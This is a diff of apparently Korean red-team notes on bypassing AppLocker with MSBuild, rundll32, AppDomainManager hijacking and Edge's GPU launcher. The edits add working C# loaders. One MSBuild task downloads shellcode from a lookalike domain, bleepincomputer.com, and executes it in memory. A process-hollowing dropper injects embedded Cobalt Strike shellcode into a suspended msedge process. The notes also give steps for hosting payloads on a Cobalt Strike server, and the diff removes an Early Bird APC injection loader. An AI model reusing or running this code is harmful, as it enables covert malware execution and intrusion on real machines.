-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern bool WriteProcessMemory(
-            IntPtr hProcess,
-            IntPtr lpBaseAddress,
-            byte[] lpBuffer,
-            int nSize,
-            out int lpNumberOfBytesWritten);
-  
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern uint ResumeThread(IntPtr hThread);
-    }
-  
-    [Flags]
-    public enum PROCESS_CREATION_FLAGS : uint
-    {
-        DEBUG_PROCESS = 0x00000001,
-        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
-        CREATE_SUSPENDED = 0x00000004,
-        DETACHED_PROCESS = 0x00000008,
-        CREATE_NEW_CONSOLE = 0x00000010,
-        NORMAL_PRIORITY_CLASS = 0x00000020,
-        IDLE_PRIORITY_CLASS = 0x00000040,
-        HIGH_PRIORITY_CLASS = 0x00000080,
-        REALTIME_PRIORITY_CLASS = 0x00000100,
-        CREATE_NEW_PROCESS_GROUP = 0x00000200,
-        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
-        CREATE_SEPARATE_WOW_VDM = 0x00000800,
-        CREATE_SHARED_WOW_VDM = 0x00001000,
-        CREATE_FORCEDOS = 0x00002000,
-        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
-        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
-        INHERIT_PARENT_AFFINITY = 0x00010000,
-        INHERIT_CALLER_PRIORITY = 0x00020000,
-        CREATE_PROTECTED_PROCESS = 0x00040000,
-        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
-        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
-        PROCESS_MODE_BACKGROUND_END = 0x00200000,
-        CREATE_SECURE_PROCESS = 0x00400000,
-        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
-        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
-        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
-        CREATE_NO_WINDOW = 0x08000000,
-        PROFILE_USER = 0x10000000,
-        PROFILE_KERNEL = 0x20000000,
-        PROFILE_SERVER = 0x40000000,
-        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
-    }
-  
-    public struct STARTUPINFOA
-    {
-        public uint cb;
-        public string lpReserved;
-        public string lpDesktop;
-        public string lpTitle;
-        public uint dwX;
-        public uint dwY;
-        public uint dwXSize;
-        public uint dwYSize;
-        public uint dwXCountChars;
-        public uint dwYCountChars;
-        public uint dwFillAttribute;
-        public STARTUPINFO_FLAGS dwFlags;
-        public ushort wShowWindow;
-        public ushort cbReserved2;
-        public IntPtr lpReserved2;
-        public IntPtr hStdInput;
-        public IntPtr hStdOutput;
-        public IntPtr hStdError;
-    }
-  
-    [Flags]
-    public enum STARTUPINFO_FLAGS : uint
-    {
-        STARTF_FORCEONFEEDBACK = 0x00000040,
-        STARTF_FORCEOFFFEEDBACK = 0x00000080,
-        STARTF_PREVENTPINNING = 0x00002000,
-        STARTF_RUNFULLSCREEN = 0x00000020,
-        STARTF_TITLEISAPPID = 0x00001000,
-        STARTF_TITLEISLINKNAME = 0x00000800,
-        STARTF_UNTRUSTEDSOURCE = 0x00008000,
-        STARTF_USECOUNTCHARS = 0x00000008,
-        STARTF_USEFILLATTRIBUTE = 0x00000010,
-        STARTF_USEHOTKEY = 0x00000200,
-        STARTF_USEPOSITION = 0x00000004,
-        STARTF_USESHOWWINDOW = 0x00000001,
-        STARTF_USESIZE = 0x00000002,
-        STARTF_USESTDHANDLES = 0x00000100
-    }
-  
-    public struct PROCESS_INFORMATION
-    {
-        public IntPtr hProcess;
-        public IntPtr hThread;
-        public uint dwProcessId;
-        public uint dwThreadId;
-    }
-  
-    public enum PROCESSINFOCLASS
-    {
-        ProcessBasicInformation = 0
-    }
-  
-    public struct PROCESS_BASIC_INFORMATION
-    {
-        public uint ExitStatus;
-        public IntPtr PebBaseAddress;
-        public ulong AffinityMask;
-        public int BasePriority;
-        public ulong UniqueProcessId;
-        public ulong InheritedFromUniqueProcessId;
-    }
-}
-```
 ### Enumerate
 ```
 # Local System의 AppLocker 정책 조회
@@ -438,6 +297,8 @@ PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol
 ### AppDomainManager
 ```
 ## Step 1. 악성 DLL 제작 (Process Hollowing)
+### 프로젝트 명 : AppDomainHijack
+### Embeded Resource : http_x64.xprocess.bin
 using System;
 using System.IO;
 using System.Reflection;
@@ -697,13 +558,19 @@ namespace AppDomainHijack
     }
 }
 
-## Step 2. AppDomainManager 환경변수 설정
+## Step 2. Cobalt Strike 웹 서버에 페이로드 호스팅 - AppDomainHijack.dll
+
+## Step 3. AppDomainHijack.dll 다운로드
+
+## Step 4. AppDomainManager 환경변수 설정
 PS> $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
 PS> $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
 
-## Step 3. ngentask.exe 실행
+## Step 5. ngentask.exe 실행
 PS> cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Windows\Tasks
-PS> .\ngentaske.exe
+PS> mv Downloads\AppDomainHijack.dll C:\Windows\Tasks\
+PS> cd C:\Windows\Tasks\
+PS> .\ngentask.exe
 ```
 ### LOLBAS 
 ```
@@ -711,91 +578,71 @@ PS> .\ngentaske.exe
 PS> "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu-sandbox --gpu-launcher="C:\Windows\Tasks\smb3_x64.exe &&"
 
 # MSBuild
-## Step 1. Cobalt Strike 웹 서버에 페이로드 호스팅
+## Step 1. Cobalt Strike 웹 서버에 페이로드 호스팅 - www.bleepincomputer.com, http_x64.xprocess.bin
 
 ## Step 2. .csproj 파일 작성
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="MSBuild">
-   <EarlyBirdTask/>
+   <MSBuildTest/>
   </Target>
    <UsingTask
-    TaskName="EarlyBirdTask"
+    TaskName="MSBuildTest"
     TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>
       <Code Type="Class" Language="cs">
         <![CDATA[
+
             using System;
             using System.Net;
             using System.Runtime.InteropServices;
             using Microsoft.Build.Framework;
             using Microsoft.Build.Utilities;
 
-            public class EarlyBirdTask : Task, ITask
+            public class MSBuildTest :  Task, ITask
             {
-                // Win32 API 정의
-                [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-                static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
-                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-                static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-                [DllImport("kernel32.dll", SetLastError = true)]
-                static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
-
-                [DllImport("kernel32.dll", SetLastError = true)]
-                static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
-
-                [DllImport("kernel32.dll", SetLastError = true)]
-                static extern uint ResumeThread(IntPtr hThread);
-
-                // 구조체 정의
-                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
-                struct STARTUPINFO { public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle; public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize; public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute; public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
-
-                [StructLayout(LayoutKind.Sequential)]
-                struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
-
                 public override bool Execute()
                 {
-                    // 1. 암호화된 쉘코드 다운로드 및 복호화
                     byte[] shellcode;
-                    using (var client = new WebClient())
+		    using (var client = new WebClient())
                     {
                         client.BaseAddress = "http://www.bleepincomputer.com/";
-                        shellcode = client.DownloadData("beacon.bin");
-                    }
-                    
-                    // 간단한 XOR 복호화 (Key: 0x41)
-                    for (int i = 0; i < shellcode.Length; i++) {
-                        shellcode[i] = (byte)((uint)shellcode[i] ^ 0x41);
+                        shellcode = client.DownloadData("http_x64.xprocess.bin");
                     }
 
-                    // 2. 희생양 프로세스 생성 (Suspended 상태)
-                    STARTUPINFO si = new STARTUPINFO();
-                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-                    // svchost.exe를 생성 (0x4 = CREATE_SUSPENDED)
-                    bool success = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+                    var hKernel = LoadLibrary("kernel32.dll");
+                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
+                    var hCt = GetProcAddress(hKernel, "CreateThread");
 
-                    if (success)
-                    {
-                        // 3. 원격 프로세스에 메모리 할당 (RW)
-                        IntPtr address = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40); // PAGE_EXECUTE_READWRITE (테스트용)
+                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
+                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);
 
-                        // 4. 쉘코드 쓰기
-                        UIntPtr bytesWritten;
-                        WriteProcessMemory(pi.hProcess, address, shellcode, (uint)shellcode.Length, out bytesWritten);
+                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
+                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);
 
-                        // 5. Early Bird 핵심: APC 큐에 쉘코드 등록
-                        QueueUserAPC(address, pi.hThread, IntPtr.Zero);
-
-                        // 6. 스레드 재개 -> 깨어나자마자 APC 큐에 있는 쉘코드 실행
-                        ResumeThread(pi.hThread);
-                    }
+                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
+                    WaitForSingleObject(t, 0xFFFFFFFF);
 
                     return true;
                 }
+
+            [DllImport("kernel32", CharSet = CharSet.Ansi)]
+            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+    
+            [DllImport("kernel32", CharSet = CharSet.Ansi)]
+            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport("kernel32")]
+            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
             }
+
         ]]>
       </Code>
     </Task>
@@ -808,7 +655,272 @@ PS> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj
 ### Rundll32
 - 파일 이름은 .dll 로 끝나야 함
 ```
-PS> rundll32 http_x64.dll,StartW
+## Step 1. 악성코드 제작
+### 프로젝트 명 : amy
+### Embeded Resource : http_x64.xprocess.bin
+using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+  
+namespace amy
+{
+    public class Dropper
+    {
+        public Dropper()
+        {
+            var si = new STARTUPINFOA
+            {
+                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
+                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
+            };
+  
+            // create hidden + suspended msedge process
+            var success = CreateProcessA(
+                "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+                "\"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --no-startup-window",
+                IntPtr.Zero,
+                IntPtr.Zero,
+                false,
+                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
+                IntPtr.Zero,
+                "C:\Program Files (x86)\Microsoft\Edge\Application\",
+                ref si,
+                out var pi);
+  
+            if (!success)
+                return;
+  
+            // get basic process information
+            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
+            var lpPbi = Marshal.AllocHGlobal(szPbi);
+  
+            NtQueryInformationProcess(
+                pi.hProcess,
+                PROCESSINFOCLASS.ProcessBasicInformation,
+                lpPbi,
+                (uint)szPbi,
+                out _);
+  
+            // marshal data to structure
+            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
+            Marshal.FreeHGlobal(lpPbi);
+  
+            // calculate pointer to image base address
+            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
+  
+            // buffer to hold data, 64-bit addresses are 8 bytes
+            var bImageBaseAddress = new byte[8];
+  
+            // read data from spawned process
+            ReadProcessMemory(
+                pi.hProcess,
+                lpImageBaseAddress,
+                bImageBaseAddress,
+                8,
+                out _);
+  
+            // convert address bytes to pointer
+            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
+  
+            // read pe headers
+            var data = new byte[512];
+  
+            ReadProcessMemory(
+                pi.hProcess,
+                baseAddress,
+                data,
+                512,
+                out _);
+  
+            // read e_lfanew
+            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
+  
+            // calculate rva
+            var rvaOffset = e_lfanew + 0x28;
+            var rva = BitConverter.ToUInt32(data, rvaOffset);
+  
+            // calculate address of entry point
+            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
+  
+            // read the shellcode
+            byte[] shellcode;
+  
+            var assembly = Assembly.GetExecutingAssembly();
+  
+            using (var rs = assembly.GetManifestResourceStream("amy.http_x64.xprocess.bin"))
+            {
+                // convert stream to raw byte[]
+                using (var ms = new MemoryStream())
+                {
+                    rs.CopyTo(ms);
+                    shellcode = ms.ToArray();
+                }
+            }
+  
+            // copy shellcode into address of entry point
+            WriteProcessMemory(
+                pi.hProcess,
+                lpEntryPoint,
+                shellcode,
+                shellcode.Length,
+                out _);
+  
+            // resume process
+            ResumeThread(pi.hThread);
+        }
+  
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern bool CreateProcessA(
+            string lpApplicationName,
+            string lpCommandLine,
+            IntPtr lpProcessAttributes,
+            IntPtr lpThreadAttributes,
+            bool bInheritHandles,
+            PROCESS_CREATION_FLAGS dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            ref STARTUPINFOA lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation);
+  
+        [DllImport("ntdll.dll", ExactSpelling = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern uint NtQueryInformationProcess(
+            IntPtr processHandle,
+            PROCESSINFOCLASS processInformationClass,
+            IntPtr processInformation,
+            uint processInformationLength,
+            out uint returnLength);
+  
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern bool ReadProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            byte[] lpBuffer,
+            UInt64 nSize,
+            out uint lpNumberOfBytesRead);
+  
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern bool WriteProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            byte[] lpBuffer,
+            int nSize,
+            out int lpNumberOfBytesWritten);
+  
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern uint ResumeThread(IntPtr hThread);
+    }
+  
+    [Flags]
+    public enum PROCESS_CREATION_FLAGS : uint
+    {
+        DEBUG_PROCESS = 0x00000001,
+        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+        CREATE_SUSPENDED = 0x00000004,
+        DETACHED_PROCESS = 0x00000008,
+        CREATE_NEW_CONSOLE = 0x00000010,
+        NORMAL_PRIORITY_CLASS = 0x00000020,
+        IDLE_PRIORITY_CLASS = 0x00000040,
+        HIGH_PRIORITY_CLASS = 0x00000080,
+        REALTIME_PRIORITY_CLASS = 0x00000100,
+        CREATE_NEW_PROCESS_GROUP = 0x00000200,
+        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+        CREATE_SEPARATE_WOW_VDM = 0x00000800,
+        CREATE_SHARED_WOW_VDM = 0x00001000,
+        CREATE_FORCEDOS = 0x00002000,
+        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+        INHERIT_PARENT_AFFINITY = 0x00010000,
+        INHERIT_CALLER_PRIORITY = 0x00020000,
+        CREATE_PROTECTED_PROCESS = 0x00040000,
+        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+        PROCESS_MODE_BACKGROUND_END = 0x00200000,
+        CREATE_SECURE_PROCESS = 0x00400000,
+        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+        CREATE_NO_WINDOW = 0x08000000,
+        PROFILE_USER = 0x10000000,
+        PROFILE_KERNEL = 0x20000000,
+        PROFILE_SERVER = 0x40000000,
+        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
+    }
+  
+    public struct STARTUPINFOA
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public STARTUPINFO_FLAGS dwFlags;
+        public ushort wShowWindow;
+        public ushort cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+  
+    [Flags]
+    public enum STARTUPINFO_FLAGS : uint
+    {
+        STARTF_FORCEONFEEDBACK = 0x00000040,
+        STARTF_FORCEOFFFEEDBACK = 0x00000080,
+        STARTF_PREVENTPINNING = 0x00002000,
+        STARTF_RUNFULLSCREEN = 0x00000020,
+        STARTF_TITLEISAPPID = 0x00001000,
+        STARTF_TITLEISLINKNAME = 0x00000800,
+        STARTF_UNTRUSTEDSOURCE = 0x00008000,
+        STARTF_USECOUNTCHARS = 0x00000008,
+        STARTF_USEFILLATTRIBUTE = 0x00000010,
+        STARTF_USEHOTKEY = 0x00000200,
+        STARTF_USEPOSITION = 0x00000004,
+        STARTF_USESHOWWINDOW = 0x00000001,
+        STARTF_USESIZE = 0x00000002,
+        STARTF_USESTDHANDLES = 0x00000100
+    }
+  
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+  
+    public enum PROCESSINFOCLASS
+    {
+        ProcessBasicInformation = 0
+    }
+  
+    public struct PROCESS_BASIC_INFORMATION
+    {
+        public uint ExitStatus;
+        public IntPtr PebBaseAddress;
+        public ulong AffinityMask;
+        public int BasePriority;
+        public ulong UniqueProcessId;
+        public ulong InheritedFromUniqueProcessId;
+    }
+}
+
+## Step 2. Cobalt Strike 웹 서버에 페이로드 호스팅 - www.bleepincomputer.com, amy.dll
+
+## Step 3. rundll32 실행
+PS> rundll32 amy.dll,StartW
 ```
 ### PowerShell CLM
 ```
